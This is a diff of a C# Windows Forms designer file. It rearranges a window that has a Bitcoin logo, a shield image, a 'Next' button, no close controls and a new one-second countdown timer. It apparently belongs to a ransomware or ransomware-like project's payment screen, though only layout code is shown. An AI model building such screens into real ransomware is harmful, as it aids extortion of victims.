@@ -28,6 +28,7 @@
         /// </summary>
         private void InitializeComponent()
         {
+            this.components = new System.ComponentModel.Container();
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainWindow));
             this.btnNext = new System.Windows.Forms.Button();
             this.rtfInfo = new System.Windows.Forms.RichTextBox();
@@ -36,15 +37,16 @@
             this.lbTitleTime = new System.Windows.Forms.Label();
             this.pbBitcoinLogo = new System.Windows.Forms.PictureBox();
             this.lbTimeLeft = new System.Windows.Forms.Label();
+            this.tmTimeLeftRefresher = new System.Windows.Forms.Timer(this.components);
             ((System.ComponentModel.ISupportInitialize)(this.pbShield)).BeginInit();
             ((System.ComponentModel.ISupportInitialize)(this.pbBitcoinLogo)).BeginInit();
             this.SuspendLayout();
             // 
             // btnNext
             // 
-            this.btnNext.Location = new System.Drawing.Point(595, 407);
+            this.btnNext.Location = new System.Drawing.Point(631, 381);
             this.btnNext.Name = "btnNext";
-            this.btnNext.Size = new System.Drawing.Size(130, 45);
+            this.btnNext.Size = new System.Drawing.Size(120, 35);
             this.btnNext.TabIndex = 0;
             this.btnNext.Text = "Next >>";
             this.btnNext.UseVisualStyleBackColor = true;
@@ -52,7 +54,7 @@
             // 
             // rtfInfo
             // 
-            this.rtfInfo.Location = new System.Drawing.Point(208, 58);
+            this.rtfInfo.Location = new System.Drawing.Point(234, 58);
             this.rtfInfo.Name = "rtfInfo";
             this.rtfInfo.ReadOnly = true;
             this.rtfInfo.ScrollBars = System.Windows.Forms.RichTextBoxScrollBars.Vertical;
@@ -64,7 +66,7 @@
             // 
             this.lbTitle.AutoSize = true;
             this.lbTitle.Font = new System.Drawing.Font("Microsoft Sans Serif", 18F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.lbTitle.Location = new System.Drawing.Point(264, 9);
+            this.lbTitle.Location = new System.Drawing.Point(242, 9);
             this.lbTitle.Name = "lbTitle";
             this.lbTitle.Size = new System.Drawing.Size(407, 29);
             this.lbTitle.TabIndex = 2;
@@ -73,7 +75,7 @@
             // pbShield
             // 
             this.pbShield.Image = ((System.Drawing.Image)(resources.GetObject("pbShield.Image")));
-            this.pbShield.Location = new System.Drawing.Point(24, 58);
+            this.pbShield.Location = new System.Drawing.Point(42, 58);
             this.pbShield.Name = "pbShield";
             this.pbShield.Size = new System.Drawing.Size(151, 180);
             this.pbShield.TabIndex = 3;
@@ -83,7 +85,7 @@
             // 
             this.lbTitleTime.AutoSize = true;
             this.lbTitleTime.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.lbTitleTime.Location = new System.Drawing.Point(50, 266);
+            this.lbTitleTime.Location = new System.Drawing.Point(77, 273);
             this.lbTitleTime.Name = "lbTitleTime";
             this.lbTitleTime.Size = new System.Drawing.Size(73, 20);
             this.lbTitleTime.TabIndex = 4;
@@ -92,7 +94,7 @@
             // pbBitcoinLogo
             // 
             this.pbBitcoinLogo.Image = ((System.Drawing.Image)(resources.GetObject("pbBitcoinLogo.Image")));
-            this.pbBitcoinLogo.Location = new System.Drawing.Point(529, 266);
+            this.pbBitcoinLogo.Location = new System.Drawing.Point(519, 291);
             this.pbBitcoinLogo.Name = "pbBitcoinLogo";
             this.pbBitcoinLogo.Size = new System.Drawing.Size(152, 50);
             this.pbBitcoinLogo.TabIndex = 5;
@@ -102,16 +104,23 @@
             // 
             this.lbTimeLeft.AutoSize = true;
             this.lbTimeLeft.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
-            this.lbTimeLeft.Location = new System.Drawing.Point(41, 313);
+            this.lbTimeLeft.Location = new System.Drawing.Point(62, 303);
             this.lbTimeLeft.Name = "lbTimeLeft";
-            this.lbTimeLeft.Size = new System.Drawing.Size(0, 20);
+            this.lbTimeLeft.Size = new System.Drawing.Size(104, 20);
             this.lbTimeLeft.TabIndex = 6;
+            this.lbTimeLeft.Text = "00:00:00:00";
+            // 
+            // tmTimeLeftRefresher
+            // 
+            this.tmTimeLeftRefresher.Enabled = true;
+            this.tmTimeLeftRefresher.Interval = 1000;
+            this.tmTimeLeftRefresher.Tick += new System.EventHandler(this.UpdateTimeLeftEvent);
             // 
             // MainWindow
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(733, 464);
+            this.ClientSize = new System.Drawing.Size(759, 421);
             this.ControlBox = false;
             this.Controls.Add(this.lbTimeLeft);
             this.Controls.Add(this.pbBitcoinLogo);
@@ -141,5 +150,6 @@
         private System.Windows.Forms.Label lbTitleTime;
         private System.Windows.Forms.PictureBox pbBitcoinLogo;
         private System.Windows.Forms.Label lbTimeLeft;
+        private System.Windows.Forms.Timer tmTimeLeftRefresher;
     }
 }
